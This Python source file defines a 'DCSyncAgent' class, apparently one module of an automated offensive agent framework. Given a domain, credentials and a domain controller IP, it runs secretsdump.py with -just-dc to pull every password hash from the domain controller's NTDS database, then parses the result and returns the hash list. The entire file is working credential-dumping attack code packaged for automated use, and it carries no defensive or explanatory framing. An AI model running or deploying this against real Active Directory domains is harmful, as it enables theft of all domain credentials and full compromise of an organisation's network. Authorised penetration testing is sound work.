"""DCSync Agent - Extract password hashes from Domain Controller"""
import asyncio, os
from typing import Dict, Any, List
from core.base_agent import BaseAgent
from core.agent_data import AgentData

class DCSyncAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="DCSyncAgent", description="Extract hashes from DC via DCSync", version="1.0.0")
        self.output_dir = "workspace/dcsync"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            domain, username, password, dc_ip = strategy.get('domain'), strategy.get('username'), strategy.get('password'), strategy.get('dc_ip')
            if not all([domain, username, password, dc_ip]):
                return AgentData(success=False, errors=["Missing parameters"])
            
            cmd = ['secretsdump.py', f'{domain}/{username}:{password}@{dc_ip}', '-just-dc', '-outputfile', f'{self.output_dir}/dc_hashes']
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            hashes = []
            if os.path.exists(f'{self.output_dir}/dc_hashes.ntds'):
                with open(f'{self.output_dir}/dc_hashes.ntds', 'r') as f:
                    hashes = [line.strip() for line in f if ':' in line]
            
            return AgentData(success=len(hashes) > 0, data={'hashes': hashes, 'count': len(hashes)})
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
